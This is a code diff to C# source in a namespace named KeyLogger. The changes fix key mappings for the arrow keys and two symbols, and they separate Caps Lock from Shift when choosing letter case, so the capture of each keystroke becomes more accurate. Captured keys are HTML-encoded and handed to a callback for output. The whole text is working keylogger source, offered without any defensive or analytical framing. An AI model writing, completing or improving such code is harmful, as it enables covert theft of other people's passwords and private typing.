@@ -10,16 +10,16 @@ namespace KeyLogger
     public class Program
     {
 
-        static Dictionary<int, string> special = new Dictionary<int, string>()
+        static readonly Dictionary<int, string> special = new Dictionary<int, string>()
         {
             { 8, "<bs>" },
             { 9, "  " },
             { 13, "<et>" },
             { 27, "<esc>" },
             { 32, " " },
-            { 37, "<ra>" },
+            { 37, "<la>" },
             { 38, "<ua>" },
-            { 39, "<la>" },
+            { 39, "<ra>" },
             { 40, "<da>" },
             { 46, "<de>" },
             { 48, ")" },
@@ -43,8 +43,8 @@ namespace KeyLogger
             { 220, "\\" },
             { 221, "]" },
             { 222, "'" },
-            { 286, "+" },
-            { 287, ":" },
+            { 286, ":" },
+            { 287, "+" },
             { 288, "<" },
             { 289, "_" },
             { 290, ">" },
@@ -94,9 +94,8 @@ namespace KeyLogger
 
         private static void Input_KeyPressed(int vKey)
         {
-            var isUpper = (((ushort)GetKeyState(0x14)) & 0xffff) != 0
-                || GetKeyState(0xA0) < 0
-                || GetKeyState(0xA1) < 0;
+            var isUpper = GetKeyState(0xA0) < 0 || GetKeyState(0xA1) < 0;
+            var isCaps = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
 
             var r = string.Empty;
             if (vKey >= 48 && vKey <= 57)
@@ -112,7 +111,7 @@ namespace KeyLogger
             }
             else if (vKey >= 65 && vKey <= 90)
             {
-                if (!isUpper) vKey += 32;
+                if (!isUpper && !isCaps) vKey += 32;
                 r = ((char)vKey).ToString();
             }
             else if (vKey >= 186 && vKey <= 222)
@@ -123,16 +122,14 @@ namespace KeyLogger
                     r = special[vKey];
                 }
             }
-            else
+            else if (special.ContainsKey(vKey))
             {
-                if (special.ContainsKey(vKey))
-                {
-                    r = special[vKey];
-                }
+                r = special[vKey];
             }
 
             if (r != string.Empty)
             {
+                //Console.Write(r);
                 callback(new { output = HttpUtility.HtmlEncode(r), returnType = 11 });
             }
         }
